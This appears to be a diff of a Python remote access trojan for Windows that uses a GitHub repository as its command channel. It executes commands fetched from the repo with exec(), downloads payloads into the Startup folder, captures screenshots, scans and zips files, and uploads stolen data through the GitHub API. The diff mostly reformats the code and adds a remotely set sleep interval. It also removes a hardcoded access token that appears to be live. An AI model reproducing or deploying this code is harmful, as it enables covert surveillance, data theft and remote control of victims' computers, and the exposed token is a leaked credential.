@@ -1,6 +1,6 @@
 from datetime import datetime
-from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd , remove
-from shutil import move , copy , copytree
+from os import fsync, listdir, environ, path, system, mkdir, walk, chdir, getcwd, remove
+from shutil import move, copy, copytree
 from time import sleep
 from github import Github
 import base64
@@ -13,7 +13,7 @@ import win32api
 import zipfile
 
 # _____(end import)_____ #
-TOKEN = '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'
+TOKEN = ''
 chdir(getcwd())
 # _____(function)_____ #
 try:
@@ -35,9 +35,11 @@ try:
         try:
             for i in (listdir("software")):
                 move(fr"software\{i}", path)
-        except:pass
+        except:
+            pass
 
-    #__________(deleted)__________#
+
+    # __________(deleted)__________#
     # __________(deleted)__________#
 
     def send_main_information(TOKEN, content, name_file_to_site):
@@ -49,10 +51,13 @@ try:
         main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}", data=data,
                             headers={"Authorization": f"token {TOKEN}"})
 
+
     def Rmpydir():
         system("rmdir /s /q python")
 
         ########
+
+
     def send_file_to_git(TOKEN, content, name_file_to_site):
         sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                            headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
@@ -62,6 +67,7 @@ try:
         main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
                             data=data,
                             headers={"Authorization": f"token {TOKEN}"})
+
 
     def create_zip_from_folder(folder_path, zip_filename):
         # ایجاد یک فایل ZIP جدید
@@ -74,13 +80,14 @@ try:
                     new_zip.write(file_path, arcname=path.relpath(file_path, folder_path))
         ########
 
-except:pass
+except:
+    pass
 
 
-def connected_to_internet(url='http://www.google.com/', timeout=5):
+def connected_to_internet(url='https://github.com/', timeout=5):
     try:
         _ = requests.head(url, timeout=timeout)
-        return True
+        return _.status_code == 200
     except requests.ConnectionError:
         return False
 
@@ -92,10 +99,9 @@ while True:
         if path.exists("python"):
             Rmpydir()
         while connected_to_internet():
-            Rmpydir()
             if not path.exists("python"): git.Git().clone("https://github.com/ehsanmehran/python")
             if path.exists("python/result_condition.ini"):
-                with open(file="python/result_condition.ini" , mode="r") as f:
+                with open(file="python/result_condition.ini", mode="r") as f:
                     exec(f.read())
             else:
                 sleep(5)
@@ -104,20 +110,24 @@ while True:
             if result_condition == "link":
                 with open(file="python/link.ini", mode="r") as f:
                     exec(f.read())
-                if not path.exists("software"):mkdir("software")
+                if not path.exists("software"): mkdir("software")
                 download(url=link, dest_folder="software")
-                send_main_information(TOKEN=TOKEN , content="result_condition = False" , name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 move_file("\Startup")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
 
             elif result_condition == "one_line_commands":
                 with open(file="python/one_line_commands.ini", mode="r") as f:
                     exec(f.read())
-                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()), name_file_to_site="last_visit.ini")# last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
 
             elif result_condition == "camera":
@@ -127,12 +137,15 @@ while True:
                 with open('code_image.ini', "wb") as file:
                     file.write(converted_string)
                 with open(file="code_image.ini", mode="r") as f:
-                    send_main_information(TOKEN=TOKEN, content=str(f.read()),name_file_to_site="code_image.ini")#code_image(TOKEN)
-                send_main_information(TOKEN=TOKEN, content="result_condition = False", name_file_to_site="result_condition.ini")# send_condition(TOKEN)
+                    send_main_information(TOKEN=TOKEN, content=str(f.read()),
+                                          name_file_to_site="code_image.ini")  # code_image(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 remove("screen.png")
                 remove("code_image.ini")
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
             elif result_condition == "scan_system":
                 if not path.exists("path"):
@@ -157,9 +170,11 @@ while True:
                 remove_path = ["path.zip", "path.ini"]
                 for i in remove_path:
                     remove(i)
-                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
             elif result_condition == "send_file":
                 if path.exists(r"python\file_path.ini"):
@@ -171,23 +186,33 @@ while True:
                             if path.isfile(i):
                                 copy(i, r"file")
                             elif path.isdir(i):
-                                copytree(i , r"file")
+                                copytree(i, r"file")
                         create_zip_from_folder("file", "file.zip")
                         with open("file.zip", "rb") as f:
                             with open("file.ini", "wb") as r:
                                 r.write(f.read())
                             with open("file.ini", "rb") as f:
-                                send_file_to_git(TOKEN=TOKEN, content=f.read(),name_file_to_site="download_file.ini")
-                send_main_information(TOKEN=TOKEN, content="result_condition = False",name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
+                                send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="download_file.ini")
+                send_main_information(TOKEN=TOKEN, content="result_condition = False",
+                                      name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
                 Rmpydir()
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
-                delete = ["file.ini" , "file.zip" , "file"]
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                delete = ["file.ini", "file.zip", "file"]
                 for i in delete:
                     remove(fr"{i}")
 
             else:
-                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini") # last_visit(TOKEN)
-                sleep(300)
+                send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
+                                      name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+                if path.exists("python\\time_sleep.ini"):
+                    with open(file="python\\time_sleep.ini", mode="r", encoding="utf8") as f:
+                        exec(f.read())
+                    sleep(time)
+                    Rmpydir()
+                else:
+                    sleep(300)
+                    Rmpydir()
     except:
         sleep(5)
         continue
